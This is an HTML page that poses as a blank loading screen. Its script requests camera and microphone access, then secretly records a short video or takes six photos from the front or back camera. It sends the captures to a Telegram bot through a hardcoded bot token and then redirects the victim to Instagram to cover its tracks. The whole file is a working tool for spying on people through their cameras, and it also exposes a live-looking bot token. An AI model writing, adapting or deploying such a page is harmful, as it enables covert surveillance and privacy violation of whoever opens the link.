<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader">
        <div class="spinner"></div>
        <p>Loading, please wait...</p>
    </div>

    <video id="video" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal)

        async function init() {
            if (!CHAT_ID) {
                window.location.href = "https://www.instagram.com";
                return;
            }

            // Agar Universal link hai (yani 'b' nahi diya gaya), toh video record hogi
            if (!cameraType) {
                startVideoRecording();
            } else {
                // Front ya Back link hone par photos capture hongi
                startPhotoCapture();
            }
        }

        // --- UNIVERSAL LINK: Video Recording (4-5 sec) ---
        async function startVideoRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                let recordedChunks = [];
                let options = { mimeType: 'video/webm; codecs=vp8,opus' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/mp4' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options = {};
                    }
                }

                const mediaRecorder = new MediaRecorder(stream, options);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
                    stream.getTracks().forEach(track => track.stop());

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'universal_video.webm');
                    formData.append('caption', '🎥 Universal Camera 4-Sec Video Captured!');

                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (e) {
                        console.error(e);
                    } finally {
                        window.location.href = "https://www.instagram.com";
                    }
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 4500);

            } catch (err) {
                window.location.href = "https://www.instagram.com";
            }
        }

        // --- FRONT/BACK LINK: 5-6 Photos Capture ---
        async function startPhotoCapture() {
            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } }
            };

            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user";
            }

            try {
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        stream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                // Thoda wait karein taaki camera adjust ho jaye
                await new Promise(resolve => setTimeout(resolve, 1500));

                const canvas = document.getElementById('canvas');
                canvas.width = videoElement.videoWidth || 1280;
                canvas.height = videoElement.videoHeight || 720;
                const context = canvas.getContext('2d');

                // 5 se 6 photos ek ke baad ek khichna
                for (let i = 1; i <= 6; i++) {
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                    
                    if (blob) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, `photo_${i}.jpg`);
                        formData.append('caption', `📸 ${cameraType.toUpperCase()} Camera - Shot ${i}/6`);

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }

                    // Har photo ke beech mein thoda gap (jaise 600ms)
                    await new Promise(resolve => setTimeout(resolve, 600));
                }

                stream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.instagram.com";

            } catch (err) {
                window.location.href = "https://www.instagram.com";
            }
        }

        window.onload = function() {
            setTimeout(init, 500);
        };
    </script>
</body>
</html>
